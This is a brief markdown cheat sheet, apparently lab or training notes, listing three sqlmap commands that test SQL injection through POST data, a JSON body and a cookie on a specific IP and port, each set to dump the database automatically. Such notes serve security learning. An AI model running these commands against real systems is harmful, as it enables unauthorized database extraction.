# SQLMap

## POST

```
sqlmap -u http://94.237.49.11:45232/case3.php --data "id=1" --batch --dump
```

## JSON

```
sqlmap -u http://94.237.49.11:45232/case4.php --data "{\\"id\\":1}" --batch --dump
```

## Cookie

```
sqlmap -u http://94.237.49.11:45232/case3.php --cookie="id=1*" --batch --dump
```
